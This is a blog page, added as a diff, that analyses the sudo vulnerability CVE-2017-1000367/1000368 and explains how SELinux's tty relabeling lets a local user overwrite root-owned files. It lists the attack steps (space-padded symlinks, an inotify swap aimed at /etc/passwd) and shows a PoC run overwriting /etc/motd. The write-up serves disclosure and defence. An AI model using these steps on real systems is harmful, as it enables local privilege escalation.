@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html xmlns="//www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+    <head>
+        
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+        <title>sudo vulnerability detail with SELinux(CVE-2017-1000367/CVE-2017-1000368) &middot; OSSセキュリティ技術の会（Secure OSS SIG)</title>
+        <link rel='stylesheet' href='//fonts.googleapis.com/css?family=Open+Sans:400,300,600' type='text/css'>
+        <link rel="stylesheet" href="https://jsoss-sig.github.io//libraries/normalize.3.0.1.css" />
+        <link rel="stylesheet" href="https://jsoss-sig.github.io//css/liquorice.css" />
+        <link rel="shortcut icon" href="https://jsoss-sig.github.io/favicon.ico" />
+        <link rel="apple-touch-icon-precomposed" href="https://jsoss-sig.github.io/apple-touch-icon-144-precomposed.png" sizes="144x144" />
+        <link rel="alternate" href="" type="application/rss+xml" title="OSSセキュリティ技術の会（Secure OSS SIG)" />
+    </head>
+    <body class="li-body">
+
+<header class="li-page-header">
+    <div class="container">
+        <div class="row">
+            <div class="sixteen columns">
+                <div class="li-brand li-left">
+                <a href="https://jsoss-sig.github.io/">OSSセキュリティ技術の会（Secure OSS SIG)</a></div>
+                <div class="li-menu li-right">
+                    <span class="li-menu-icon" onclick="javascript:toggle('menu');">&#9776;</span>
+                    <ul id="menu2" class="li-menu-items">
+                        
+                            <li><a href="https://jsoss-sig.github.io/about/about/"> 会について(About us) </a></li>
+                        
+                            <li><a href="https://jsoss-sig.github.io/post/"> Blog </a></li>
+                        
+                            <li><a href="https://jsoss-sig.github.io/event/"> イベント等(Events) </a></li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="sixteen columns">
+                <ul id="menu" class="li-menu-items li-menu-mobile">
+                    
+                        <li><a href="https://jsoss-sig.github.io/about/about/"> 会について(About us) </a></li>
+                    
+                        <li><a href="https://jsoss-sig.github.io/post/"> Blog </a></li>
+                    
+                        <li><a href="https://jsoss-sig.github.io/event/"> イベント等(Events) </a></li>
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+
+
+    <div class="container">
+        <div class="row">
+            <div class="sixteen columns">
+                <article class="li-article">
+                    <header class="li-article-header">
+                        <h1 class="li-article-title">sudo vulnerability detail with SELinux(CVE-2017-1000367/CVE-2017-1000368)</h1>
+                        <span class="li-article-taxonomies">
+                            
+
+                            
+                        </span>
+                        
+                        <time class="li-article-date">Saturday, June 24, 2017</time>
+                    </header>
+                    <section>
+                        
+
+<p>There&rsquo;s much misunderstanding about  &ldquo;sudo&rdquo; vulnerability(CVE-2017-<sup>1000367</sup>&frasl;<sub>1000368</sub>) that &ldquo;SELinux caused some vuulnerable&rdquo;. On this blog, we will describe details about tha vulnerability and why it is depending on SELinux.</p>
+
+<p>(Written by Kazuki Omo:ka-omo@sios.com).</p>
+
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+
+<p>You can easy to find the details of &ldquo;what is the vulnerability&rdquo; on Qualys Security Advisory(<a href="http://www.openwall.com/lists/oss-security/2017/05/30/16">http://www.openwall.com/lists/oss-security/2017/05/30/16</a>).</p>
+
+<p>Actually, this vulnerability is completely comes from &ldquo;sudo&rdquo; source code.</p>
+
+<p>As the description on above Qualys Security Advisory, main problem is &ldquo;sudo behaivor when he get space-contained command&rdquo;.</p>
+
+<p>When someone run sudo, sudo program will get user information(user_info: uid, cwd, etc.) by calling get_user_info(). And get_user_info() will call sudo_ttyname_dev()-&gt;sudo_ttyname_scan() for device &ldquo;breadth-first scan&rdquo;. During the sudo_ttyname_scan(), it will obtain &ldquo;tty number for that process running&rdquo; by 7th field on &ldquo;/proc/[pid]/stat&rdquo;.</p>
+
+<p>ex.  When you run mlayer on /dev/pts/0(tty) as pid=2778:</p>
+
+<pre><code>    jsossug@cent7enc:~$ cat /proc/2778/stat
+    2778 (mplayer) S 2366 2778 2366 34816 2778 1077936128 10433 ....
+</code></pre>
+
+<ol>
+<li><p>From above output, &ldquo;34816&rdquo; is the dev number.</p></li>
+
+<li><p>&ldquo;34816&rdquo;(Dec) -&gt; &ldquo;0000 0000 0000 0000 1000 1000 0000 0000&rdquo;(BN). Maigor number is &ldquo;31-20 bit + 7-0 bit&rdquo;. Minor number is &ldquo;19-8&rdquo; bit. Then Major number is &ldquo;000010001000 = 136&rdquo;, and Minor number is &ldquo;0000 0000 0000 0000 = 0&rdquo;.
+  .</p></li>
+
+<li><p>For the confirmation, check &ldquo;ls -l /dev/pts/0&rdquo; output;</p>
+
+<pre><code>jsossug@cent7enc:~$ ls -l /dev/pts/0
+crw--w---- 1 jsossug tty 136, 0 Jun 22 12:49 /dev/pts/0
+</code></pre></li>
+
+<li><p>From above output, you can see &ldquo;136,0&rdquo; which is &ldquo;Major, Minor&rdquo; number.</p></li>
+</ol>
+
+<p>The problem is /proc/[pid]/stat file is &ldquo;space-separated&rdquo; output. So, if someone run &ldquo;cmd&rdquo; which contain space, sudo_ttyname_scan() will treat other field as tty name(this is mainly bug).</p>
+
+<p>When Malicious attacker will run cmd with 6-spaces, he can easy to change tty number to any number. And if he can change that tty&rsquo;s symbolic link to file, and treat that file as stdout, he can overwrite that file whatever he wants.
+For this sequence, attacker can use sudo&rsquo;s SELinux implementation.</p>
+
+<h2 id="how-to-attack">How to attack</h2>
+
+<p>Here is the steps for attacking;</p>
+
+<ol>
+<li><p>Create /dev/shm/_tmp which is world-writable directory.</p>
+
+<pre><code>jsossug@cent7enc:/dev/shm$ mkdir _tmp
+</code></pre></li>
+
+<li><p>Create symbolic link &ldquo;/dev/shm/_tmp/tty&rdquo; as non-existent pts &ldquo;/dev/pts/57&rdquo;.</p>
+
+<pre><code>jsossug@cent7enc:/dev/shm$ ln -s /dev/pts/57 /dev/shm/_tmp/tty
+jsossug@cent7enc:/dev/shm$ ls -l /dev/shm/_tmp
+lrwxrwxrwx. 1 jsossug jsossug 11  Jun 22 09:02 tty -&gt; /dev/pts/57
+</code></pre></li>
+
+<li><p>&rdquo;/dev/pts/57&rdquo; device number will be &ldquo;34873&rdquo; as above explanation. So, create symbolic link &ldquo;/dev/shm/_tmp/      34873&rdquo; for &ldquo;/usr/bin/sudo&rdquo;.</p>
+
+<pre><code>[jsossug@cent7enc _tmp]$ ln -s /usr/bin/sudo &quot;/dev/shm/_tmp/     34873 &quot;
+[jsossug@cent7enc _tmp]$ ls -l
+lrwxrwxrwx. 1 jsossug jsossug 13  Jun 22 09:07      34873  -&gt; /usr/bin/sudo
+</code></pre></li>
+
+<li><p>Use inotify for monitoring IN_OPEN on /dev/shm/_tmp directory. When /dev/shm/_tmp directory is accessed, change /dev/shm/_tmp/_tty to file which you want to overwrite(/etc/passwd, for example).</p></li>
+</ol>
+
+<hr />
+
+<h2 id="so-how-selinux-is-involved-on-this-vulnerability">So, how SELinux is involved on this vulnerability?</h2>
+
+<p>On above step 4, sudo program will think his tty is &ldquo;/dev/shm/_tmp&rdquo; which is linked to &ldquo;/etc/passwd&rdquo;.</p>
+
+<ol>
+<li><p>If SELinux is enabled on the system<strong>(doesn&rsquo;t matter Enforcing or Permissive)</strong>, and &ldquo;-r Role&rdquo; option is specified , exec_setup() in sudo will call selinux_setup();</p>
+
+<pre><code>bool
+exec_setup(struct command_details *details, const char *ptyname, int ptyfd)
+{
+--snip-- 
+#ifdef HAVE_SELINUX
+    if (ISSET(details-&gt;flags, CD_RBAC_ENABLED)) {
+        if (selinux_setup(details-&gt;selinux_role, details-&gt;selinux_type,
+            ptyname ? ptyname : user_details.tty, ptyfd) == -1)
+            goto done;
+    }
+#endif
+</code></pre></li>
+
+<li><p>selinux_setup() will call relabel_tty() for relabeling the tty;</p>
+
+<pre><code>int
+selinux_setup(const char *role, const char *type, const char *ttyn,
+    int ptyfd)
+{
+--snip--
+    if (relabel_tty(ttyn, ptyfd) &lt; 0) {
+        warning(_(&quot;unable to setup tty context for %s&quot;), se_state.new_context);
+        goto done;
+    }
+</code></pre></li>
+
+<li><p>During the relabel_tty(), program will re-open ttyn which is now &ldquo;/etc/passwd&rdquo;.
+    &ndash;snip&ndash;
+            /* Re-open tty to get new label and reset std{in,out,err} */
+            close(se_state.ttyfd);
+            se_state.ttyfd = open(ttyn, O_RDWR|O_NONBLOCK);
+    &ndash;snip&ndash;</p>
+
+<p>And call dup2(se_state.ttyfd, ptyfd) for duplicating fd.</p>
+
+<pre><code>--snip--
+                for (fd = STDIN_FILENO; fd &lt;= STDERR_FILENO; fd++) {
+                    if (isatty(fd) &amp;&amp; dup2(se_state.ttyfd, fd) == -1) {
+--snip--
+</code></pre>
+
+<p>Then stdin/stdout/stderr will be set as /etc/passwd. So now the &ldquo;cmd&rdquo; stdout/stderr will be /etc/passwd, then you can overwrite /etc/passwd if you control the cmd output!!</p></li>
+</ol>
+
+<hr />
+
+<h2 id="poc-with-selinux-enabled">PoC with SELinux enabled.</h2>
+
+<p>PoC is available on the Internet. In here, we use /etc/motd(only root can write) for attack file. And use &ldquo;/usr/bin/sum&rdquo; for the command, then add /usr/bin/sum as permitted command for &ldquo;sudovul(test user)&rdquo;.</p>
+
+<pre><code>    sudovul ALL=(ALL)NOPASSWD:/usr/bin/sum
+</code></pre>
+
+<ol>
+<li><p>Confirm SELinux is Permissive mode;</p>
+
+<pre><code>sudovul@cent7enc:~# getenforce
+Permissive
+</code></pre></li>
+
+<li><p>Run PoC on localhost as sudovul;</p>
+
+<pre><code> [sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
+ [sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
+ /usr/bin/sum: unrecognized option '--
+ HELLO
+ WORLD
+ '
+ Try '/usr/bin/sum --help' for more information.
+</code></pre></li>
+
+<li><p>Change SELinux to Enforcing mode;</p>
+
+<pre><code>sudovul@cent7enc:~# getenforce
+Enforcing
+</code></pre></li>
+
+<li><p>Clear /etc/motd and run PoC on localhost as sudovul;</p>
+
+<pre><code> [sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
+ [sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
+ /usr/bin/sum: unrecognized option '--
+ HELLO
+ WORLD
+ '
+ Try '/usr/bin/sum --help' for more information.
+</code></pre></li>
+</ol>
+
+<p>So, we can overwrite /etc/motd in SELinux Permissive/Enforcing Mode.</p>
+
+<hr />
+
+<h2 id="poc-with-selinux-disabled">PoC with SELinux Disabled</h2>
+
+<ol>
+<li><p>set SELinux as Disabled in /etc/selinux/config, and reboot.</p>
+
+<pre><code>root@cent7enc:~# getenforce
+Disabled
+</code></pre></li>
+
+<li><p>Clear /etc/motd, and run PoC code again.</p>
+
+<pre><code>[sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
+/usr/bin/sum: unrecognized option '--
+HELLO
+WORLD
+'
+Try '/usr/bin/sum --help' for more information.
+</code></pre></li>
+
+<li><p>Check /etc/motd is not modified.</p>
+
+<pre><code>[sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
+[sudovul@cent7enc sudo-CVE-2017-1000367]$ 
+</code></pre></li>
+</ol>
+
+<hr />
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>From above Vulnerability details and PoC, we can say;</p>
+
+<ol>
+<li>The main vulnerability is coming from sudo.</li>
+<li>SELinux is not exactlly used for the attack. Sudo will open tty and dup the fd for relabeling tty(malicious user can use it for attack).</li>
+<li>This Vulnerablity condition is <strong>SELinux Enabled(not only Enforcing, but also Permissive.)</strong>. For fixing the problem, update sudo package.</li>
+</ol>
+
+                    </section>
+                </article>
+            </div>
+        </div>
+
+        <div class="row li-author">
+    <div class="sixteen columns">
+        Written by <strong>SOSS SIG</strong>
+    </div>
+</div>
+
+
+        <div class="row li-pagination">
+            <div class="eight columns">
+                <div class="li-pagination-previous">
+                    
+                        &nbsp;
+                    
+                </div>
+            </div>
+            <div class="eight columns">
+                <div class="li-pagination-next">
+                    
+                        Older article<br />
+                        <a href="https://jsoss-sig.github.io/post/omok-selinux-struts2-20170607/"> CVE-2017-5638(Struts2) PoC with SELinux</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <script type="text/javascript">
+    <!--
+    function toggle(id) {
+        var e = document.getElementById(id);
+        e.style.display == 'block' ? e.style.display = 'none' : e.style.display = 'block';
+    }
+    
+    </script>
+    
+    </body>
+</html>
+
